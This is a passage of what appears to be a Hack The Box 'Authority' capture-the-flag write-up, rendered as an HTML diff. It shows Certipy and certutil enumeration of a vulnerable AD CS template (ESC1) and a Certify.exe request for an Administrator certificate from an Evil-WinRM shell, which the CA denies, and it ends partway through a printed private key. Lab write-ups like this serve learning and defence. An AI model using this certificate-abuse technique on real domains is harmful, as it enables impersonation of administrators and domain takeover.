+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>BloodHound<span class="w"> </span>data<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20230805150934_Certipy.zip&#39;</span>.<span class="w"> </span>Drag<span class="w"> </span>and<span class="w"> </span>drop<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>BloodHound<span class="w"> </span>GUI<span class="w"> </span>from<span class="w"> </span>@ly4k
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>text<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20230805150934_Certipy.txt&#39;</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>JSON<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;20230805150934_Certipy.json&#39;</span>
+</pre></div>
+</div>
+<p>Certipy results</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">1</span>
+<span class="w">    </span>Template<span class="w"> </span>Name<span class="w">                       </span>:<span class="w"> </span>CorpVPN
+<span class="w">    </span>Display<span class="w"> </span>Name<span class="w">                        </span>:<span class="w"> </span>Corp<span class="w"> </span>VPN
+<span class="w">    </span>Certificate<span class="w"> </span>Authorities<span class="w">             </span>:<span class="w"> </span>AUTHORITY-CA
+<span class="w">    </span>Enabled<span class="w">                             </span>:<span class="w"> </span>True
+<span class="w">    </span>Client<span class="w"> </span>Authentication<span class="w">               </span>:<span class="w"> </span>True
+<span class="w">    </span>Enrollment<span class="w"> </span>Agent<span class="w">                    </span>:<span class="w"> </span>False
+<span class="w">    </span>Any<span class="w"> </span>Purpose<span class="w">                         </span>:<span class="w"> </span>False
+<span class="w">    </span>Enrollee<span class="w"> </span>Supplies<span class="w"> </span>Subject<span class="w">           </span>:<span class="w"> </span>True
+<span class="w">    </span>Certificate<span class="w"> </span>Name<span class="w"> </span>Flag<span class="w">               </span>:<span class="w"> </span>EnrolleeSuppliesSubject
+<span class="w">    </span>Enrollment<span class="w"> </span>Flag<span class="w">                     </span>:<span class="w"> </span>AutoEnrollmentCheckUserDsCertificate
+<span class="w">                                          </span>PublishToDs
+<span class="w">                                          </span>IncludeSymmetricAlgorithms
+<span class="w">    </span>Private<span class="w"> </span>Key<span class="w"> </span>Flag<span class="w">                    </span>:<span class="w"> </span><span class="m">16777216</span>
+<span class="w">                                          </span><span class="m">65536</span>
+<span class="w">                                          </span>ExportableKey
+<span class="w">    </span>Extended<span class="w"> </span>Key<span class="w"> </span>Usage<span class="w">                  </span>:<span class="w"> </span>Encrypting<span class="w"> </span>File<span class="w"> </span>System
+<span class="w">                                          </span>Secure<span class="w"> </span>Email
+<span class="w">                                          </span>Client<span class="w"> </span>Authentication
+<span class="w">                                          </span>Document<span class="w"> </span>Signing
+<span class="w">                                          </span>IP<span class="w"> </span>security<span class="w"> </span>IKE<span class="w"> </span>intermediate
+<span class="w">                                          </span>IP<span class="w"> </span>security<span class="w"> </span>use
+<span class="w">                                          </span>KDC<span class="w"> </span>Authentication
+<span class="w">    </span>Requires<span class="w"> </span>Manager<span class="w"> </span>Approval<span class="w">           </span>:<span class="w"> </span>False
+<span class="w">    </span>Requires<span class="w"> </span>Key<span class="w"> </span>Archival<span class="w">               </span>:<span class="w"> </span>False
+<span class="w">    </span>Authorized<span class="w"> </span>Signatures<span class="w"> </span>Required<span class="w">      </span>:<span class="w"> </span><span class="m">0</span>
+<span class="w">    </span>Validity<span class="w"> </span>Period<span class="w">                     </span>:<span class="w"> </span><span class="m">20</span><span class="w"> </span>years
+<span class="w">    </span>Renewal<span class="w"> </span>Period<span class="w">                      </span>:<span class="w"> </span><span class="m">6</span><span class="w"> </span>weeks
+<span class="w">    </span>Minimum<span class="w"> </span>RSA<span class="w"> </span>Key<span class="w"> </span>Length<span class="w">              </span>:<span class="w"> </span><span class="m">2048</span>
+<span class="w">    </span>Permissions
+<span class="w">      </span>Enrollment<span class="w"> </span>Permissions
+<span class="w">        </span>Enrollment<span class="w"> </span>Rights<span class="w">               </span>:<span class="w"> </span>AUTHORITY.HTB<span class="se">\D</span>omain<span class="w"> </span>Computers
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">      </span>Object<span class="w"> </span>Control<span class="w"> </span>Permissions
+<span class="w">        </span>Owner<span class="w">                           </span>:<span class="w"> </span>AUTHORITY.HTB<span class="se">\A</span>dministrator
+<span class="w">        </span>Write<span class="w"> </span>Owner<span class="w"> </span>Principals<span class="w">          </span>:<span class="w"> </span>AUTHORITY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\A</span>dministrator
+<span class="w">        </span>Write<span class="w"> </span>Dacl<span class="w"> </span>Principals<span class="w">           </span>:<span class="w"> </span>AUTHORITY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\A</span>dministrator
+<span class="w">        </span>Write<span class="w"> </span>Property<span class="w"> </span>Principals<span class="w">       </span>:<span class="w"> </span>AUTHORITY.HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">                                          </span>AUTHORITY.HTB<span class="se">\A</span>dministrator
+<span class="w">    </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Vulnerabilities
+<span class="w">      </span>ESC1<span class="w">                              </span>:<span class="w"> </span><span class="s1">&#39;AUTHORITY.HTB\\Domain Computers&#39;</span><span class="w"> </span>can<span class="w"> </span>enroll,<span class="w"> </span>enrollee<span class="w"> </span>supplies<span class="w"> </span>subject<span class="w"> </span>and<span class="w"> </span>template<span class="w"> </span>allows<span class="w"> </span>client<span class="w"> </span>authentication
+</pre></div>
+</div>
+<p>Certipy is already telling us that the <code class="docutils literal notranslate"><span class="pre">CorpVPN</span></code> template is vulnerable and why, manually enumerating the template anyway</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w">  </span>Template<span class="o">[</span><span class="m">8</span><span class="o">]</span>:
+<span class="w">  </span><span class="nv">TemplatePropCommonName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CorpVPN
+<span class="w">  </span><span class="nv">TemplatePropFriendlyName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Corp<span class="w"> </span>VPN
+<span class="w">  </span><span class="nv">TemplatePropEKUs</span><span class="w"> </span><span class="o">=</span>
+<span class="m">7</span><span class="w"> </span>ObjectIds:
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.10.3.4<span class="w"> </span>Encrypting<span class="w"> </span>File<span class="w"> </span>System
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.4<span class="w"> </span>Secure<span class="w"> </span>Email
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.2<span class="w"> </span>Client<span class="w"> </span>Authentication
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.10.3.12<span class="w"> </span>Document<span class="w"> </span>Signing
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.8.2.2<span class="w"> </span>IP<span class="w"> </span>security<span class="w"> </span>IKE<span class="w"> </span>intermediate
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.7<span class="w"> </span>IP<span class="w"> </span>security<span class="w"> </span>user
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.2.3.5<span class="w"> </span>KDC<span class="w"> </span>Authentication
+
+<span class="w">  </span><span class="nv">TemplatePropCryptoProviders</span><span class="w"> </span><span class="o">=</span>
+<span class="w">    </span><span class="m">0</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Enhanced<span class="w"> </span>Cryptographic<span class="w"> </span>Provider<span class="w"> </span>v1.0
+<span class="w">    </span><span class="m">1</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Base<span class="w"> </span>Cryptographic<span class="w"> </span>Provider<span class="w"> </span>v1.0
+
+<span class="w">  </span><span class="nv">TemplatePropMajorRevision</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">64</span><span class="w"> </span><span class="o">(</span><span class="m">100</span><span class="o">)</span>
+<span class="w">  </span><span class="nv">TemplatePropDescription</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>User
+<span class="w">  </span><span class="nv">TemplatePropSchemaVersion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">2</span>
+<span class="w">  </span><span class="nv">TemplatePropMinorRevision</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">8</span>
+<span class="w">  </span><span class="nv">TemplatePropRASignatureCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+<span class="w">  </span><span class="nv">TemplatePropMinimumKeySize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="w"> </span><span class="o">(</span><span class="m">2048</span><span class="o">)</span>
+<span class="w">  </span><span class="nv">TemplatePropOID</span><span class="w"> </span><span class="o">=</span>
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.21.8.9199372.15294569.5129608.13980871.2433934.254.5580598.4156950<span class="w"> </span>Corp<span class="w"> </span>VPN
+
+<span class="w">  </span><span class="nv">TemplatePropV1ApplicationPolicy</span><span class="w"> </span><span class="o">=</span>
+<span class="m">7</span><span class="w"> </span>ObjectIds:
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.10.3.4<span class="w"> </span>Encrypting<span class="w"> </span>File<span class="w"> </span>System
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.4<span class="w"> </span>Secure<span class="w"> </span>Email
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.2<span class="w"> </span>Client<span class="w"> </span>Authentication
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.10.3.12<span class="w"> </span>Document<span class="w"> </span>Signing
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.8.2.2<span class="w"> </span>IP<span class="w"> </span>security<span class="w"> </span>IKE<span class="w"> </span>intermediate
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.5.7.3.7<span class="w"> </span>IP<span class="w"> </span>security<span class="w"> </span>user
+<span class="w">    </span><span class="m">1</span>.3.6.1.5.2.3.5<span class="w"> </span>KDC<span class="w"> </span>Authentication
+
+<span class="w">  </span><span class="nv">TemplatePropEnrollmentFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="o">(</span><span class="m">25</span><span class="o">)</span>
+<span class="w">    </span>CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS<span class="w"> </span>--<span class="w"> </span><span class="m">1</span>
+<span class="w">    </span>CT_FLAG_PUBLISH_TO_DS<span class="w"> </span>--<span class="w"> </span><span class="m">8</span>
+<span class="w">    </span>CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE<span class="w"> </span>--<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="o">)</span>
+
+<span class="w">  </span><span class="nv">TemplatePropSubjectNameFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>
+<span class="w">    </span>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<span class="w"> </span>--<span class="w"> </span><span class="m">1</span>
+
+<span class="w">  </span><span class="nv">TemplatePropPrivateKeyFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1010010</span><span class="w"> </span><span class="o">(</span><span class="m">16842768</span><span class="o">)</span>
+<span class="w">    </span>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY<span class="w"> </span>--<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="o">)</span>
+<span class="w">    </span>CTPRIVATEKEY_FLAG_ATTEST_NONE<span class="w"> </span>--<span class="w"> </span><span class="m">0</span>
+<span class="w">    </span>TEMPLATE_SERVER_VER_2003<span class="s">&lt;&lt;CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)</span>
+<span class="s">    TEMPLATE_CLIENT_VER_XP&lt;&lt;CTPRIVATEKEY_FLAG_</span>CLIENTVERSION_SHIFT<span class="w"> </span>--<span class="w"> </span><span class="m">1000000</span><span class="w"> </span><span class="o">(</span><span class="m">16777216</span><span class="o">)</span>
+
+<span class="w">  </span><span class="nv">TemplatePropGeneralFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>2023a<span class="w"> </span><span class="o">(</span><span class="m">131642</span><span class="o">)</span>
+<span class="w">    </span>CT_FLAG_ADD_EMAIL<span class="w"> </span>--<span class="w"> </span><span class="m">2</span>
+<span class="w">    </span>CT_FLAG_PUBLISH_TO_DS<span class="w"> </span>--<span class="w"> </span><span class="m">8</span>
+<span class="w">    </span>CT_FLAG_EXPORTABLE_KEY<span class="w"> </span>--<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">(</span><span class="m">16</span><span class="o">)</span>
+<span class="w">    </span>CT_FLAG_AUTO_ENROLLMENT<span class="w"> </span>--<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="o">(</span><span class="m">32</span><span class="o">)</span>
+<span class="w">    </span>CT_FLAG_ADD_TEMPLATE_NAME<span class="w"> </span>--<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">(</span><span class="m">512</span><span class="o">)</span>
+<span class="w">    </span>CT_FLAG_IS_MODIFIED<span class="w"> </span>--<span class="w"> </span><span class="m">20000</span><span class="w"> </span><span class="o">(</span><span class="m">131072</span><span class="o">)</span>
+
+<span class="w">  </span><span class="nv">TemplatePropSecurityDescriptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>O:LAG:S-1-5-21-622327497-3269355298-2248959698-519D:PAI<span class="o">(</span>OA<span class="p">;;</span>CR<span class="p">;</span>0e10c968-78fb-11d2-90d4-00c04f79dc55<span class="p">;;</span>DC<span class="o">)(</span>OA<span class="p">;;</span>CR<span class="p">;</span>a05b8cc2-17bc-4802-a710-e7c15ab866a2<span class="p">;;</span>DC<span class="o">)(</span>OA<span class="p">;;</span>RPWPCR<span class="p">;</span>0e10c968-78fb-11d2-90d4-00c04f79dc55<span class="p">;;</span>DA<span class="o">)(</span>OA<span class="p">;;</span>RPWPCR<span class="p">;</span>0e10c968-78fb-11d2-90d4-00c04f79dc55<span class="p">;;</span>S-1-5-21-622327497-3269355298-2248959698-519<span class="o">)(</span>A<span class="p">;;</span>LCRPRC<span class="p">;;;</span>DC<span class="o">)(</span>A<span class="p">;;</span>CCDCLCSWRPWPDTLOSDRCWDWO<span class="p">;;;</span>DA<span class="o">)(</span>A<span class="p">;;</span>CCDCLCSWRPWPDTLOSDRCWDWO<span class="p">;;;</span>S-1-5-21-622327497-3269355298-2248959698-519<span class="o">)(</span>A<span class="p">;;</span>CCDCLCSWRPWPDTLOSDRCWDWO<span class="p">;;;</span>LA<span class="o">)(</span>A<span class="p">;;</span>LCRPLORC<span class="p">;;;</span>AU<span class="o">)</span>
+
+<span class="w">    </span>Allow<span class="w"> </span>Enroll<span class="w">        </span>HTB<span class="se">\D</span>omain<span class="w"> </span>Computers
+<span class="w">    </span>Allow<span class="w"> </span>Auto-Enroll<span class="w">   </span>HTB<span class="se">\D</span>omain<span class="w"> </span>Computers
+<span class="w">    </span>Allow<span class="w"> </span>Enroll<span class="w">        </span>HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">    </span>Allow<span class="w"> </span>Enroll<span class="w">        </span>HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">    </span>Allow<span class="w"> </span>Read<span class="w">  </span>HTB<span class="se">\D</span>omain<span class="w"> </span>Computers
+<span class="w">    </span>Allow<span class="w"> </span>Full<span class="w"> </span>Control<span class="w">  </span>HTB<span class="se">\D</span>omain<span class="w"> </span>Admins
+<span class="w">    </span>Allow<span class="w"> </span>Full<span class="w"> </span>Control<span class="w">  </span>HTB<span class="se">\E</span>nterprise<span class="w"> </span>Admins
+<span class="w">    </span>Allow<span class="w"> </span>Full<span class="w"> </span>Control<span class="w">  </span>HTB<span class="se">\A</span>dministrator
+<span class="w">    </span>Allow<span class="w"> </span>Read<span class="w">  </span>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users
+
+
+<span class="w">  </span><span class="nv">TemplatePropExtensions</span><span class="w"> </span><span class="o">=</span>
+<span class="m">4</span><span class="w"> </span>Extensions:
+
+<span class="w">  </span>Extension<span class="o">[</span><span class="m">0</span><span class="o">]</span>:
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.21.7:<span class="w"> </span><span class="nv">Flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">Length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">31</span>
+<span class="w">    </span>Certificate<span class="w"> </span>Template<span class="w"> </span>Information
+<span class="w">        </span><span class="nv">Template</span><span class="o">=</span>Corp<span class="w"> </span>VPN<span class="o">(</span><span class="m">1</span>.3.6.1.4.1.311.21.8.9199372.15294569.5129608.13980871.2433934.254.5580598.4156950<span class="o">)</span>
+<span class="w">        </span>Major<span class="w"> </span>Version<span class="w"> </span><span class="nv">Number</span><span class="o">=</span><span class="m">100</span>
+<span class="w">        </span>Minor<span class="w"> </span>Version<span class="w"> </span><span class="nv">Number</span><span class="o">=</span><span class="m">8</span>
+
+<span class="w">  </span>Extension<span class="o">[</span><span class="m">1</span><span class="o">]</span>:
+<span class="w">    </span><span class="m">2</span>.5.29.37:<span class="w"> </span><span class="nv">Flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">Length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>4b
+<span class="w">    </span>Enhanced<span class="w"> </span>Key<span class="w"> </span>Usage
+<span class="w">        </span>Encrypting<span class="w"> </span>File<span class="w"> </span>System<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.4.1.311.10.3.4<span class="o">)</span>
+<span class="w">        </span>Secure<span class="w"> </span>Email<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.5.5.7.3.4<span class="o">)</span>
+<span class="w">        </span>Client<span class="w"> </span>Authentication<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.5.5.7.3.2<span class="o">)</span>
+<span class="w">        </span>Document<span class="w"> </span>Signing<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.4.1.311.10.3.12<span class="o">)</span>
+<span class="w">        </span>IP<span class="w"> </span>security<span class="w"> </span>IKE<span class="w"> </span>intermediate<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.5.5.8.2.2<span class="o">)</span>
+<span class="w">        </span>IP<span class="w"> </span>security<span class="w"> </span>user<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.5.5.7.3.7<span class="o">)</span>
+<span class="w">        </span>KDC<span class="w"> </span>Authentication<span class="w"> </span><span class="o">(</span><span class="m">1</span>.3.6.1.5.2.3.5<span class="o">)</span>
+
+<span class="w">  </span>Extension<span class="o">[</span><span class="m">2</span><span class="o">]</span>:
+<span class="w">    </span><span class="m">2</span>.5.29.15:<span class="w"> </span><span class="nv">Flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="o">(</span>Critical<span class="o">)</span>,<span class="w"> </span><span class="nv">Length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">4</span>
+<span class="w">    </span>Key<span class="w"> </span>Usage
+<span class="w">        </span>Digital<span class="w"> </span>Signature,<span class="w"> </span>Key<span class="w"> </span>Encipherment<span class="w"> </span><span class="o">(</span>a0<span class="o">)</span>
+
+<span class="w">  </span>Extension<span class="o">[</span><span class="m">3</span><span class="o">]</span>:
+<span class="w">    </span><span class="m">1</span>.3.6.1.4.1.311.21.10:<span class="w"> </span><span class="nv">Flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">Length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">59</span>
+<span class="w">    </span>Application<span class="w"> </span>Policies
+<span class="w">        </span><span class="o">[</span><span class="m">1</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>Encrypting<span class="w"> </span>File<span class="w"> </span>System
+<span class="w">        </span><span class="o">[</span><span class="m">2</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>Secure<span class="w"> </span>Email
+<span class="w">        </span><span class="o">[</span><span class="m">3</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>Client<span class="w"> </span>Authentication
+<span class="w">        </span><span class="o">[</span><span class="m">4</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>Document<span class="w"> </span>Signing
+<span class="w">        </span><span class="o">[</span><span class="m">5</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>IP<span class="w"> </span>security<span class="w"> </span>IKE<span class="w"> </span>intermediate
+<span class="w">        </span><span class="o">[</span><span class="m">6</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>IP<span class="w"> </span>security<span class="w"> </span>user
+<span class="w">        </span><span class="o">[</span><span class="m">7</span><span class="o">]</span>Application<span class="w"> </span>Certificate<span class="w"> </span>Policy:
+<span class="w">             </span>Policy<span class="w"> </span><span class="nv">Identifier</span><span class="o">=</span>KDC<span class="w"> </span>Authentication
+
+<span class="w">  </span><span class="nv">TemplatePropValidityPeriod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">20</span><span class="w"> </span>Years
+<span class="w">  </span><span class="nv">TemplatePropRenewalPeriod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">6</span><span class="w"> </span>Weeks
+</pre></div>
+</div>
+<p>This template is vulnerable because:</p>
+<ul class="simple">
+<li><ol class="arabic simple">
+<li><p>Domain Computers can request one</p></li>
+</ol>
+</li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>    <span class="n">Allow</span> <span class="n">Enroll</span>        <span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Computers</span>
+    <span class="n">Allow</span> <span class="n">Auto</span><span class="o">-</span><span class="n">Enroll</span>   <span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Computers</span>
+    <span class="n">Allow</span> <span class="n">Enroll</span>        <span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
+    <span class="n">Allow</span> <span class="n">Enroll</span>        <span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
+    <span class="n">Allow</span> <span class="n">Read</span>  <span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Computers</span>
+    <span class="n">Allow</span> <span class="n">Full</span> <span class="n">Control</span>  <span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
+    <span class="n">Allow</span> <span class="n">Full</span> <span class="n">Control</span>  <span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
+    <span class="n">Allow</span> <span class="n">Full</span> <span class="n">Control</span>  <span class="n">HTB</span>\<span class="n">Administrator</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><ol class="arabic simple" start="2">
+<li><p>It has Client Authorization EKU, which means the issued cert can be used for Kerberos auth</p></li>
+</ol>
+</li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>    <span class="n">Application</span> <span class="n">Policies</span>
+        <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span>
+        <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">Secure</span> <span class="n">Email</span>
+        <span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">Client</span> <span class="n">Authentication</span>
+        <span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">Document</span> <span class="n">Signing</span>
+        <span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">IP</span> <span class="n">security</span> <span class="n">IKE</span> <span class="n">intermediate</span>
+        <span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">IP</span> <span class="n">security</span> <span class="n">user</span>
+        <span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="n">Application</span> <span class="n">Certificate</span> <span class="n">Policy</span><span class="p">:</span>
+             <span class="n">Policy</span> <span class="n">Identifier</span><span class="o">=</span><span class="n">KDC</span> <span class="n">Authentication</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><ol class="arabic simple" start="3">
+<li><p>It lets the enrollee specify the SAN</p></li>
+</ol>
+</li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>  <span class="n">TemplatePropSubjectNameFlags</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</span> <span class="o">--</span> <span class="mi">1</span>
+</pre></div>
+</div>
+<p>We request a certificate for it, still with ceritfy.exe, but we get <code class="docutils literal notranslate"><span class="pre">Denied</span> <span class="pre">by</span> <span class="pre">Policy</span> <span class="pre">Module</span></code> when requesting the certificate, presumably because we are doing that as <code class="docutils literal notranslate"><span class="pre">svc_ldap</span></code>, which is a user and not a computer, and the policy only allows computers.:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM* PS C:\Certs&gt; ./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:Administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#39;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : HTB\svc_ldap
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CorpVPN
+[*] Subject                 : CN=svc_ldap, OU=Service Accounts, OU=CORP, DC=authority, DC=htb
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : authority.authority.htb\AUTHORITY-CA
+
+[!] CA Response             : The submission failed: Denied by Policy Module
+[!] Last status             : 0x80094012. Message: The permissions on the certificate template do not allow the current user to enroll for this type of certificate. (Exception from HRESULT: 0x80094012)
+[*] Request ID              : 13
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0MbwEq/cS2N1q8rr/Hpimo35wLI7Pp638YkgFv+nZL/986cE
+C/ZjASQFyF9ESohuck2xbhfL6A7/ubmGbbBbjNLE5Nfmc1A8iuAHZH4jPWgJ97m0
+LGchE4LY4MxHCQG15GUHXHa4GcjndoqRMR7JF6WiRlTZjZLim5AKL4H6tguHQgMk
+XSZhvUMZsZvbAmBGNwVCPclaEC7O7RlF79bd09wEYRiceTN8BmUc1/wfxULQx3TQ
+qWUsMvkhjoTBxWQobjz2P4d0J6xTHGuyWuXvCEqs6WBhlFWyK15XgKo7Pe20DJ6f
+lWDWvi9+/0A5VLiKj/WWJANkRJdoXGHvmyVg/QIDAQABAoIBAEumOilbRcSfZmz4
+W2gh5IbCOSREsMjw9A/2MwWCX2JXWyqlcwbuoVMxfVLsii9DnlmWo1sUDlOo06q1
+eetXAuVVHfkZ7iwMf9OGd8dHGXfPsgTsakfImqiaOgHCo161GvaGUROFBRJ6xLwk
+W5Xj5NPHtbQsXKQ6/BeIKtiqDXFWtkzvOQ5z9IV98IfH+QOHRQh3U8MIMHD/HdfK
